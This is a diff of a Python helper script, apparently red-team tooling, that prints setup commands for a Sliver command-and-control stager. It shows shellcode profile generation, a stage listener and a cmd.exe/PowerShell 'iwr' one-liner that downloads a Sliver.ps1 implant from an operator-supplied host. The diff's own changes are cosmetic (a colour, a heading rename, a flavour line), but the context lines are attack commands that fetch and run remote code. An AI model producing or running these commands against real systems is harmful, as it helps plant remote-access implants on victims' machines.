@@ -69,6 +69,7 @@ iwr2 = 'C:\Windows\System32\cmd.exe /c powershell.exe iwr -UseBasicParsing http:
 
 CRED = '\033[91m'
 CGREEN = '\033[92m'
+CPURPLE = '\033[95m'
 CEND = '\033[0m'
 
 print ("\n")
@@ -80,7 +81,7 @@ print ("███████║███████╗██║ ╚███�
 print ("╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝     ╚══════╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═╝")
 print ("\n")
 
-print (CRED + "==== Sliver Stage Setup ====\n" + CEND)
+print (CRED + "==== Sliver Stager Setup ====\n" + CEND)
 print ("profiles new --mtls "+ip+" --format shellcode win64")
 print ("")
 print ("stage-listener --url http://"+ip+":"+port+" --profile win64")
@@ -104,3 +105,5 @@ print (CRED + "==== IWR Sliver.ps1 Download to Disk via webserver 8080 !OSPEC ==
 print (iwr)
 print ("")
 print (iwr2)
+print ("")
+print (CPURPLE + "Bred as living shields, these slivers have proven unruly—they know they cannot be caught." + CEND)
